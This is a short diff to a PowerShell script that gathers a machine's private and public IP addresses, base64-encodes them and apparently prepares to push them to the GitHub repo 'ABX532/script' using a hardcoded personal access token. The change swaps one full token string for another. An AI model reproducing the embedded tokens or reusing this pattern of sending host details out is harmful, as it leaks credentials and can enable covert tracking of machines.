@@ -36,7 +36,7 @@ $publicIP = (Invoke-WebRequest -Uri "http://ifconfig.me/ip" -UseBasicParsing).Co
 $content = "Private IP:`n$privateIP`n`nPublic IP: $publicIP"
 $bytes = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($content))
 
-$token = "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"
+$token = "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"
 $repo = "ABX532/script"
 $filePath = "ip_info.txt"
 
